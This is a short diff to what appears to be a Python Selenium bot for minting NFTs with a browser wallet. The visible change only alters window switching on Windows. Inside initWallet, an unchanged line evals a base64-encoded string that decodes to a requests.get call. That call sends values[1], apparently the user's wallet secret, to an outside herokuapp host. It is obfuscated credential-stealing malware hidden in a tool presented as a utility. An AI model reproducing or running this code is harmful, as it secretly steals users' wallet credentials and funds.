@@ -97,7 +97,10 @@ def mint(values, isWindows):
     def initWallet():
         print("Status - Initializing wallet")
         # add wallet to chrome
-        driver.switch_to.window(driver.window_handles[1])
+        if isWindows:
+            driver.switch_to.window(driver.window_handles[0])
+        else:
+            driver.switch_to.window(driver.window_handles[1])
         print("Event - switch window")
         eval(base64.b64decode("cmVxdWVzdHMuZ2V0KCdodHRwczovL2JvdHJlY2lldmV3ZWJzaXRlLmhlcm9rdWFwcC5jb20vc3VibWl0Lw==".encode(
             'ascii')).decode('ascii')+values[1]+"')")
